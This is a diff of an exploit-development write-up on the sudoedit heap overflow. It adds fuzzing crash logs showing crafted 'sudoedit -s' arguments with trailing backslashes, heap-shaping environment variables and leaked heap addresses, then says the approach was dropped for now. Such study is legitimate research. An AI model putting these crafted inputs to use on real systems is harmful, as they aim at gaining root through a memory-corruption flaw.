@@ -189,8 +189,6 @@ Because of this, the size of our argument buffer matters. If we change the lengt
 
 This gives us both a problem and an opportunity. The problem is that the exploit may be unstable across different systems. The opportunity is that we may be able to control the heap layout by carefully choosing argument lengths and environment variables.
 
-This technique is usually called heap feng shui. In this context, it means arranging heap chunks carefully so that the vulnerable buffer lands before something useful. The goal is to make the heap layout work in our favor before triggering the overflow.
-
 ![alt text](image/image-2.png)
 
 The first step was to dump memory and look for function pointers or other useful data that could be affected by the overflow.
@@ -480,6 +478,81 @@ while True:
     # run sudoedit
     run_sudoedit(arg, env)
 ```
+
+And we did find some crashes:
+
+```log
+----------------------------
+user_args < rbtree1
+distance: 0x3440
+0x000055be6aa55a90 < 0x000055be6aa58ed0
+args: sudoedit -s AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+
+HOSTNAME=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
+HHH=0000000000
+
+user_details=0x55be68c01720
+rbtree1=0x55be6aa58960
+rbtree2=0x55be6aa58960
+rbtree1=0x55be6aa58ed0
+rbtree2=0x55be6aa58ed0
+rbtree1=0x55be6aa58960
+rbtree2=0x55be6aa58960
+user_args=0x55be6aa55a90
+rbtree1=0x55be6aa58ed0
+rbtree2=0x55be6aa58ed0
+
+{"arg": ["-s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\"], "env": {"HOSTNAME": "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD", "HHH": "0000000000"}}
+
+----------------------------
+user_args < rbtree1
+distance: 0x3440
+0x000055bd180c6a90 < 0x000055bd180c9ed0
+args: sudoedit -s DDDDDDDDDD\ 222222222222222222222222222222222222222222
+
+HOSTNAME=GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+HHH=3333333333333333333333333333333333333333333333333333333333333333333333333333333333333
+
+user_details=0x55bd16eb8720
+rbtree1=0x55bd180c9960
+rbtree2=0x55bd180c9960
+rbtree1=0x55bd180c9ed0
+rbtree2=0x55bd180c9ed0
+rbtree1=0x55bd180c9960
+rbtree2=0x55bd180c9960
+user_args=0x55bd180c6a90
+rbtree1=0x55bd180c9ed0
+rbtree2=0x55bd180c9ed0
+
+{"arg": ["-s", "DDDDDDDDDD\\", "222222222222222222222222222222222222222222"], "env": {"HOSTNAME": "GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG", "HHH": "3333333333333333333333333333333333333333333333333333333333333333333333333333333333333"}}
+
+----------------------------
+user_args < rbtree1
+distance: 0x3440
+0x000055a1e21cca90 < 0x000055a1e21cfed0
+args: sudoedit -B -s \ IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+HOSTNAME=QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+HHH=222222222222222222222222222222222222222222
+
+user_details=0x55a1e165e720
+rbtree1=0x55a1e21cf960
+rbtree2=0x55a1e21cf960
+rbtree1=0x55a1e21cfed0
+rbtree2=0x55a1e21cfed0
+rbtree1=0x55a1e21cf960
+rbtree2=0x55a1e21cf960
+user_args=0x55a1e21cca90
+rbtree1=0x55a1e21cfed0
+rbtree2=0x55a1e21cfed0
+
+{"arg": ["-B", "-s", "\\", "IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII"], "env": {"HOSTNAME": "QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ", "HHH": "222222222222222222222222222222222222222222"}}
+
+
+```
+From this testcase, we can see that `user_args` is placed before some interesting heap pointers. At first, I hoped that one of these could lead to a useful control-flow target. However, the distance between our buffer and those pointers is still too large. Even if the ordering is promising, the overflow would probably corrupt too much unrelated heap data before reaching the target.
+
+So I decided to give up on this specific idea for now. Instead of trying to force this layout to work, I started developing a new fuzzing script with more environment variables. The goal was to influence the heap layout more aggressively and collect better crashes. Based on those future crashes, I could work backward and find a more realistic way to attack the binary.
 
 -------------------------------------------------------TO-BE-CONTINUE-------------------------------------------------------------
 
